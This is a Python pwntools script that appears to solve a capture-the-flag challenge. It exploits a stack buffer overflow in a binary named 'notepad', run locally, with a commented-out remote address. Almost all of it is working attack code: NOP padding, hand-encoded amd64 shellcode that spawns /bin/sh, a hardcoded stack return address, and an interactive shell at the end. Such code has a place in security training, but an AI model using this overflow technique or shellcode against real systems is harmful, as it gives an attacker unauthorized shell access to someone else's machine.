from pwn import *

p = process("./notepad")
# p = remote("140.115.59.7", 11002)
# print(p.recv())
raw_input("attach gdb")

# padding = cyclic(0xff+0xf)
# padding = "A" * cyclic_find("naaboaab") # full padding
# padding = "A" * cyclic_find("baabcaab") # inject pwntools default shellcode
padding = b"\x90" * 96

# RET = p64(0x4004ee)

# RIP = p64(0x4242424243434343)
# RIP = p64(0x7fffffffe0f0)
RIP = p64(0x7fffffffe150)
# RIP = p64(0x7fffffffe150)

context(arch = 'amd64', os = 'linux')
# shellcode = asm(shellcraft.amd64.linux.sh())
shellcode = b"""\x6A\x42\x58\xFE\xC4\x48\x99\x52\xEB\x06\x90\x90\x90\x90\x90\x90\x49\x89\xD0\x49\x89\xD2\xEB\x08\x90\x90\x90\x90\x90\x90\x90\x90\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\xEB\x04\x90\x90\x90\x90\x57\x54\x5E\x0F\x05"""
tail = b"\x90" * 3
NOP = "\x90" * 100

# show_me_magic
# RIP = p64(0x400627)

# frame_dummy
# RIP = p64(0x400620)

p.sendline(padding + shellcode + tail + RIP)
p.interactive()